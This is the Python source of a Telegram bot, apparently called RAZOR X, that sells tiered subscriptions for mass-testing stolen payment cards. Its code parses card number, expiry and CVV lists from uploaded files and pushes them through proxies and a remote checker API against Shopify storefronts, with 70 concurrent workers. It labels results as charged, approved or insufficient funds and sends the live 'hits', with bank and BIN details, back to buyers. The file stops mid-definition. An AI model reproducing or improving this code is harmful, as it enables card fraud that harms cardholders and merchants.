# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽𝙤𝙩 - 𝙑𝙄𝙋 𝙀𝘿𝙄𝙏𝙄𝙊𝙉 (𝗠𝗮𝘀𝘀 𝗢𝗻𝗹𝘆 - 𝗘𝗿𝗿𝗼𝗿-𝗙𝗿𝗲𝗲)
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import logging
import io
from datetime import datetime, timedelta
from urllib.parse import urlparse

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    is_premium_user, is_banned_user, get_all_user_proxies,
    get_proxy_count, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, is_user_marked_joined, mark_user_joined,
    remove_joined_mark, get_total_users, get_premium_count
)

# ====================== CONFIG ======================
API_ID = int(os.getenv('API_ID', 0))
API_HASH = os.getenv('API_HASH', '').strip()
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()

client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client

_admin_env = os.getenv("ADMIN_ID", "8879293808")
try: ADMIN_ID = [int(x.strip()) for x in _admin_env.split(",") if x.strip()]
except: ADMIN_ID = [8879293808]

JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", 0))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", 0))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
PROXY_FILE = 'proxy.txt'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")

# --- INCREASED WORKERS ---
WORKERS = 70 
API_TIMEOUT = 60  
DELAY = 0.05
HIT_DELAY = 0.5

# ====================== VIP EMOJIS & FLAGS ======================
# ضع الآيديات الخاصة بك هنا لتظهر في الردود
VIP_EMOJIS = {
    "charged": "5039644681583985437",
    "approved": "5039793437776282663",
    "insufficient": "5042176294222037888",
    "card": "5042101437237036298",
    "bank": "5042334757040423886",
    "country_default": "5042186567783809934",
    "time": "5042306247047513767",
    "price": "5042050649248760772",
    "gateway": "5042186567783809934",
    "msg": "5039649904264217620"
}

# ضع آيديات الايموجيات المتحركة لأعلام الدول (استبدل الصفر 0 بالـ ID الخاص بالعلم المتحرك)
CUSTOM_COUNTRY_EMOJIS = {
    "US": 0, "GB": 0, "CA": 0, "AU": 0, "DE": 0, "FR": 0, "IT": 0, "ES": 0, "BR": 0, "IN": 0,
    "SA": 0, "AE": 0, "KW": 0, "QA": 0, "BH": 0, "OM": 0, "EG": 0, "JO": 0, "MA": 0, "DZ": 0,
    "TR": 0, "RU": 0, "CN": 0, "JP": 0, "KR": 0, "MX": 0, "AR": 0, "CO": 0, "CL": 0, "PE": 0,
    "ZA": 0, "NG": 0, "KE": 0, "SE": 0, "NO": 0, "DK": 0, "FI": 0, "NL": 0, "BE": 0, "CH": 0,
    "AT": 0, "PT": 0, "GR": 0, "PL": 0, "CZ": 0, "HU": 0, "RO": 0, "BG": 0, "IE": 0, "NZ": 0,
    "SG": 0, "MY": 0, "TH": 0, "VN": 0, "ID": 0, "PH": 0, "PK": 0, "BD": 0, "LK": 0, "NP": 0,
    "IL": 0, "IR": 0, "IQ": 0, "SY": 0, "LB": 0, "YE": 0, "SD": 0, "LY": 0, "TN": 0, "MR": 0
    # يمكن إضافة بقية الدول براحتك
}

# 25+ ANIME GIFS
ANIME_GIFS = [
    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif", "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif", "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif", "https://media.giphy.com/media/F3uJq1J1x0u6k/giphy.gif",
    "https://media.giphy.com/media/7ZjnR6t2kU2lO/giphy.gif", "https://media.giphy.com/media/f3IVyFGEA1uVwZ7h2o/giphy.gif",
    "https://media.giphy.com/media/oYxqA3S2ZqO3u/giphy.gif", "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif",
    "https://media.giphy.com/media/xUPGcxpCV81ebhq7cI/giphy.gif", "https://media.giphy.com/media/l41lUjUgLLwWPe20E/giphy.gif",
    "https://media.giphy.com/media/l0HlNQ03J5JxX6lva/giphy.gif", "https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif",
    "https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif", "https://media.giphy.com/media/l3vR16pONsV8cKCEE/giphy.gif",
    "https://media.giphy.com/media/xT0xezQGU5xCDJuCPe/giphy.gif", "https://media.giphy.com/media/3oKIPnAiaCRi8NNRWU/giphy.gif",
    "https://media.giphy.com/media/xT9IgzoWaVYHbYqNUk/giphy.gif", "https://media.giphy.com/media/26BkLGA2PqBf02Mpy/giphy.gif",
    "https://media.giphy.com/media/3o7TKsQ8gE0bF40Y6I/giphy.gif", "https://media.giphy.com/media/xT0xem7ZlZ2DOYqpG0/giphy.gif",
    "https://media.giphy.com/media/l46CtynlAiRNzfsIG/giphy.gif", "https://media.giphy.com/media/3o7WIxrKxS22wI3B0A/giphy.gif",
    "https://media.giphy.com/media/l0HlRnAWXxn0MhKLK/giphy.gif", "https://media.giphy.com/media/xT9DPIlGnuHpr2yOic/giphy.gif"
]

PLANS = {
    "plan1": {"name": "𝗖𝗢𝗥𝗘 𝗔𝗖𝗖𝗘𝗦𝗦", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": "𝗘𝗟𝗜𝗧𝗘 𝗔𝗖𝗖𝗘𝗦𝗦", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": "𝗥𝗢𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": "𝗫-𝗔𝗖𝗖𝗘𝗦𝗦", "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

# Security & Flood Control
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
HIT_BUTTON = [[Button.url("⇾ 𝗢𝗪𝗡𝗘𝗥 ⇽", "https://t.me/Dddadddyttt")]]

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty', 'tax amount is empty', 
    'payment method identifier is empty', 'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout', 'network error', 
    'connection reset', 'failed to detect product', 'failed to create checkout', 'failed to tokenize card', 
    'failed to get proposal data', 'submit rejected', 'handle error', 'http 404', 'url rejected',
    'malformed input', 'amount_too_small', 'amount too small', 'site dead', 'captcha_required', 
    'site errors', 'failed', 'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'proxy error', 'proxy connection', 'bad proxy', 'connection timeout failed', 
    'session_error', 'session expired'
)

# ====================== HELPER FUNCTIONS ======================
def is_dead_site_error(error_msg):
    if not error_msg: return True
    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)

async def is_user_joined(user_id):
    if not JOIN_CHANNEL_ID and not JOIN_GROUP_ID: return True
    try:
        if JOIN_CHANNEL_ID:
            part = await client_instance(GetParticipantRequest(channel=JOIN_CHANNEL_ID, participant=user_id))
            if isinstance(part.participant, ChannelParticipantBanned): return False
        if JOIN_GROUP_ID:
            part = await client_instance(GetParticipantRequest(channel=JOIN_GROUP_ID, participant=user_id))
            if isinstance(part.participant, ChannelParticipantBanned): return False
        return True
    except: return False

async def force_join_check(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return True
    if await is_user_joined(uid): return True
    
    kb = []
    if JOIN_CHANNEL_LINK: kb.append(Button.url("📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", JOIN_CHANNEL_LINK))
    if JOIN_GROUP_LINK: kb.append(Button.url("💬 𝗝𝗢𝗜𝗡 𝗚𝗥𝗢𝗨𝗣", JOIN_GROUP_LINK))
    kb = [kb, [Button.inline("✅ 𝗩𝗘𝗥𝗜𝗙𝗬", b"check_joined")]]
    await event.reply(f"<b>⚠️ 𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗳𝗶𝗿𝘀𝘁!</b>", buttons=kb, parse_mode="html")
    return False

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = plan.lower() if plan else ""
    if plan_lower == "core": return 100
    if plan_lower == "elite": return 500
    if plan_lower == "root": return 2000
    if plan_lower == "x": return 10000
    return 15

async def send_premium_only_message(event):
    return await event.reply("<b>⚠️ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱.</b>", parse_mode="html")

async def styled_reply(event, text, buttons=None, file=None):
    return await event.reply(text, buttons=buttons, file=file, parse_mode="html")

async def styled_send(chat, text, buttons=None, file=None):
    return await client_instance.send_message(chat, text, buttons=buttons, file=file, parse_mode="html")

async def styled_edit(msg, text, buttons=None):
    return await msg.edit(text, buttons=buttons, parse_mode="html")

async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}", timeout=10) as r:
                if r.status == 200:
                    data = await r.json()
                    return {
                        "brand": data.get("brand", "-"),
                        "type": data.get("type", "-"),
                        "level": data.get("level", "-"),
                        "bank": data.get("bank", "-"),
                        "country": data.get("country_name", "-"),
                        "country_code": data.get("country", "-"),
                        "flag": data.get("country_flag", "🏳️")
                    }
    except: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}

async def fetch_random_gif():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(random.choice(ANIME_GIFS), timeout=5) as r:
                if r.status == 200:
                    b = io.BytesIO(await r.read())
                    b.name = 'hit.gif'
                    return b
    except: pass
    return None

# ====================== LUXURY HIT FORMATTER ======================
def get_custom_emoji(key, fallback=""):
    eid = VIP_EMOJIS.get(key, "")
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>' if eid else fallback

def get_country_emoji(c_code, default_flag):
    eid = CUSTOM_COUNTRY_EMOJIS.get(c_code, 0)
    if eid != 0:
        return f'<tg-emoji emoji-id="{eid}">{default_flag}</tg-emoji>'
    return get_custom_emoji("country_default", default_flag)

def format_card_result(status, card, gateway, response, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    
    if status == "Charged":
        header = f"<b>⦗ {get_custom_emoji('charged', '🟢')} ⦘ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬</b>"
    elif status == "Approved":
        header = f"<b>⦗ {get_custom_emoji('approved', '⚡')} ⦘ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗩𝗩</b>"
    elif status == "Insufficient":
        header = f"<b>⦗ {get_custom_emoji('insufficient', '🟡')} ⦘ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 (𝗖𝗖𝗡)</b>"
    elif status == "Dead":
        header = f"<b>⦗ 🔴 ⦘ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</b>"
    else:
        header = f"<b>⦗ ⚠️ ⦘ 𝗘𝗥𝗥𝗢𝗥 / 𝗥𝗘𝗧𝗥𝗬</b>"

    c_code = bi.get('country_code', '')
    country_display = f"{bi.get('country', '-')} {get_country_emoji(c_code, bi.get('flag', '🏳️'))}"

    return f"""{header}

<b>⦗ {get_custom_emoji('card', '💳')} ⦘ 𝗖𝗔𝗥𝗗 ⇾</b> <code>{card}</code>

<b>⦗ {get_custom_emoji('msg', '💬')} ⦘ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ⇾</b> <code>{response}</code>

<b>⦗ {get_custom_emoji('gateway', '🌐')} ⦘ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ⇾</b> <code>{gateway}</code>
<b>⦗ {get_custom_emoji('price', '💲')} ⦘ 𝗣𝗥𝗜𝗖𝗘 ⇾</b> <code>{ps}</code>

<b>⦗ {get_custom_emoji('bank', '🏦')} ⦘ 𝗕𝗔𝗡𝗞 𝗜𝗡𝗙𝗢 ⇾</b> 
<b>├ 𝗕𝗮𝗻𝗸:</b> <code>{bi.get('bank', '-')}</code>
<b>├ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> <code>{country_display}</code>
<b>├ 𝗕𝗿𝗮𝗻𝗱:</b> <code>{bi.get('brand', '-')}</code>
<b>╰ 𝗧𝘆𝗽𝗲:</b> <code>{bi.get('type', '-')} - {bi.get('level', '-')}</code>

<b>⦗ {get_custom_emoji('time', '⏱')} ⦘ 𝗧𝗢𝗢𝗞 ⇾</b> <code>{elapsed:.2f}s</code>"""

# ====================== HTTP SESSIONS ======================
_USER_HTTP_SESSIONS = {}
_USER_SEMS = {}

def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        _USER_SEMS[key] = asyncio.Semaphore(WORKERS)
    return _USER_SEMS[key]

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT), connector=connector)
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except: pass

def cleanup_user_sem(uid):
    for k in list(_USER_SEMS.keys()):
        if k.startswith(f"{uid}_"): del _USER_SEMS[k]

# ====================== EXTRACTION ======================
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def format_proxy_for_api(proxy):
    if not proxy: return ""
    if isinstance(proxy, dict):
        if proxy.get('username') and proxy.get('password'):
            return f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
        return f"{proxy['ip']}:{proxy['port']}"
    if isinstance(proxy, str):
        clean = proxy.strip()
        if "://" in clean:
            try: return urlparse(clean).netloc
            except: return clean
        return clean
    return ""

_CACHED_SITES = []
_LAST_SITES_FETCH = 0
async def get_github_sites():
    global _CACHED_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SITES
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, timeout=10) as r:
                if r.status == 200:
                    text = await r.text()
                    sites = [re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in text.split('\n') if line.strip()]
                    if sites:
                        _CACHED_SITES = list(set(sites))
                        _LAST_SITES_FETCH = now
    except: pass
    if not _CACHED_SITES and os.path.exists('sites.txt'):
        try:
            with open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SITES = list(set([re.sub(r'^https?://', '', line.strip()).rstrip('/') for line in f if line.strip()]))
        except: pass
    return _CACHED_SITES

def get_txt_proxies(): return [] # Custom Logic if any

# ====================== API CHECKER ======================
async def check_card_api(card, site, proxy, session):
    try:
        parts = card.split('|')
        if len(parts) != 4: return {'status': 'Dead', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site}
        fproxy = format_proxy_for_api(proxy)
        if fproxy: params['proxy'] = fproxy
        
        async with session.get(CHECKER_API_URL, params=params) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(text_data)
            except: return {'status': 'Site Error', 'message': 'Format Error from Server API', 'card': card, 'retry': True}

        response_msg = rj.get('Response', '')
        price = rj.get('Price', '-')
        gate = rj.get('Gate', 'Shopify')
        status = rj.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = str(response_msg).lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare active', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'insufficient_funds' in response_lower or 'insufficient funds' in response_lower:
            return {'status': 'Insufficient', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']):
                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception: return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, max_retries=3):
    last_result = None
    if not sites: return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Shopify', 'price': '-'}
    available_proxies = list(proxies) if proxies else [None]

    for attempt in range(max_retries):
        if not available_proxies: available_proxies = list(proxies) if proxies else [None]
        site = random.choice(sites)
        proxy = random.choice(available_proxies)
        
        result = await check_card_api(card, site, proxy, session)
        if not result.get('retry'): return result

        last_result = result
        if proxy and 'proxy' in str(result.get('message', '')).lower() and proxy in available_proxies:
            available_proxies.remove(proxy)

        if attempt < max_retries - 1: await asyncio.sleep(DELAY) 

    if last_result: return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': last_result.get('gateway', 'Shopify'), 'price': last_result.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Shopify', 'price': '-'}

# ====================== AUTO MASS CHECK (FILE HANDLER) ======================
@client.on(events.NewMessage(func=lambda e: getattr(e, 'document', None) and e.document.mime_type.startswith('text/')))
async def auto_file_check_cmd(event):
    try:
        uid = event.sender_id
        now = time.time()
        if uid in USER_LAST_REQ and now - USER_LAST_REQ[uid] < 5:
            return await event.reply("<b>⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗯𝗲𝗳𝗼𝗿𝗲 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝗻𝗼𝘁𝗵𝗲𝗿 𝗳𝗶𝗹𝗲.</b>", parse_mode="html")
        USER_LAST_REQ[uid] = now

        if getattr(event.document, 'size', 0) > 2 * 1024 * 1024:
            return await event.reply("<b>⚠️ 𝗙𝗶𝗹𝗲 𝘁𝗼𝗼 𝗹𝗮𝗿𝗴𝗲! (𝗠𝗮𝘅 𝟮𝗠𝗕)</b>", parse_mode="html")

        if not await force_join_check(event): return
        
        plan = await get_user_plan(uid)
        if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
        
        if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, "<b>⚠️ 𝗔 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝘂𝗻𝗻𝗶𝗻𝗴!</b>")
        
        fp = await event.download_media()
        content = ""
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
        finally:
            if os.path.exists(fp): os.remove(fp)

        cards = extract_cc(content)
        if not cards: return await styled_reply(event, "<b>⚠️ 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝗳𝗶𝗹𝗲.</b>")
        
        cl = get_cc_limit(plan, uid)
        if len(cards) > cl: cards = cards[:cl]
        
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        
        await styled_reply(event, f"<b>⦗ ⚙️ ⦘ 𝗜𝗡𝗜𝗧𝗜𝗔𝗟𝗜𝗭𝗜𝗡𝗚 𝗘𝗡𝗚𝗜𝗡𝗘...</b>\n\n<b>├ 𝗟𝗼𝗮𝗱𝗲𝗱:</b> <code>{len(cards)} 𝗖𝗖𝘀</code>\n<b>├ 𝗪𝗼𝗿𝗸𝗲𝗿𝘀:</b> <code>{WORKERS}</code>\n<b>╰ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆:</b> <code>𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀</code>")
        
        asyncio.create_task(_run_mass_process(event, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", "𝗦𝗛𝗢𝗣𝗜𝗙𝗬", "msp"))
    except Exception as e: await event.reply(f"⚠️ Error: {e}")

async def _run_mass_process(event, cards, process_store, stop_prefix, gate_name, sem_type):
    uid = event.sender_id
    total = len(cards); checked = charged = approved = insufficient = declined = errors = 0
    st = time.time()
    
    sites = await get_github_sites()
    proxies = await get_all_user_proxies(uid)
    proxies.extend(get_txt_proxies())
    proxies = [p for p in proxies if p]

    user_sem = get_user_sem(uid, sem_type)
    http_session = await get_user_http_session(uid, sem_type)
    
    sm = await styled_reply(event, f"<b>⦗ 🔄 ⦘ 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗙𝗜𝗟𝗘...</b>")
    lcd = "-"
    
    def is_stopped():
        proc = process_store.get(uid)
        return proc.get("stopped", False) if isinstance(proc, dict) else True

    async def dashboard_updater():
        while not is_stopped():
            await asyncio.sleep(2)
            if is_stopped(): break
            kb = [
                [Button.inline(f"⦗ 💳 ⦘ {lcd}", b"none")],
                [Button.inline(f"🟢 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ⇾ {approved}", b"none")],
                [Button.inline(f"🟡 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ⇾ {declined}", b"none")],
                [Button.inline(f"⚠️ 𝗘𝗥𝗥𝗢𝗥𝗦 ⇾ {errors}", b"none"), Button.inline(f"📊 𝗧𝗢𝗧𝗔𝗟 ⇾ {checked} / {total}", b"none")],
                [Button.inline("🛑 𝗦𝗧𝗢𝗣 𝗣𝗥𝗢𝗖𝗘𝗦𝗦", f"{stop_prefix}:{uid}".encode())]
            ]
            try: await styled_edit(sm, f"<b>⦗ ⚡ ⦘ 𝗘𝗡𝗚𝗜𝗡𝗘 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...</b>\n\n<b>├ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> <code>{gate_name}</code>\n<b>╰ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 ⇾</b> <code>{WORKERS}</code>", buttons=kb)
            except: pass
            
    updater_task = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)

    async def worker():
        nonlocal checked, charged, approved, insufficient, declined, errors, lcd
        while not queue.empty() and not is_stopped():
            try: card = queue.get_nowait()
            except asyncio.QueueEmpty: break
            
            try:
                async with user_sem:
                    res = await check_card_with_retry(card, sites, proxies, http_session, max_retries=3)
                    
                status = res.get('status', 'Dead')
                message = res.get('message', 'Error')
                gateway = res.get('gateway', 'Shopify')
                price = res.get('price', '-')
                
                checked += 1
                lcd = card
                
                if status == 'Charged':
                    charged += 1
                    asyncio.create_task(_send_mass_hit(card, "Charged", message, price, gateway, uid))
                elif status == 'Approved':
                    approved += 1
                    asyncio.create_task(_send_mass_hit(card, "Approved", message, price, gateway, uid))
                elif status == 'Insufficient':
                    insufficient += 1
                    asyncio.create_task(_send_mass_hit(card, "Insufficient", message, price, gateway, uid))
                elif status == 'Site Error': errors += 1
                else: declined += 1
                    
                queue.task_done()
            except Exception as e:
                queue.task_done()
                errors += 1
                checked += 1

    workers_tasks = [asyncio.create_task(worker()) for _ in range(WORKERS)]
    process_store[uid]["tasks"] = workers_tasks
    await asyncio.gather(*workers_tasks, return_exceptions=True)
    updater_task.cancel()
    
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    
    fkb = [
        [Button.inline(f"🟢 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ⇾ {approved}", b"none")],
        [Button.inline(f"🟡 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ⇾ {declined}", b"none")],
        [Button.inline(f"📊 𝗧𝗢𝗧𝗔𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 ⇾ {checked} / {total}", b"none")],
        [Button.inline(f"⏱ 𝗧𝗜𝗠𝗘 𝗧𝗔𝗞𝗘𝗡 ⇾ {h}𝗵 {m}𝗺 {s}𝘀", b"none")]
    ]
    try: await styled_edit(sm, f"<b>⦗ ✨ ⦘ 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗</b>\n\n<b>├ 𝗔𝗹𝗹 𝗰𝗮𝗿𝗱𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗰𝗵𝗲𝗰𝗸𝗲𝗱.</b>\n<b>╰ 𝗡𝗼 𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘀𝗲𝗻𝘁, 𝗵𝗶𝘁𝘀 𝗮𝗿𝗲 𝗮𝗯𝗼𝘃𝗲.</b>", buttons=fkb)
    except: pass
        
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type)
    cleanup_user_sem(uid)

async def _send_mass_hit(card, status, message, price, gateway, uid):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, 0.0)
        
        gif_io = await fetch_random_gif() if status in ["Charged", "Approved", "Insufficient"] else None
        
        if gif_io:
            try: await styled_send(uid, msg, buttons=HIT_BUTTON, file=gif_io)
            except: await styled_send(uid, msg, buttons=HIT_BUTTON)
        else:
            await styled_send(uid, msg, buttons=HIT_BUTTON)
    except: pass

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer("None active!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer("Stopping Engine...", alert=True)

@client.on(events.CallbackQuery(data=b"check_joined"))
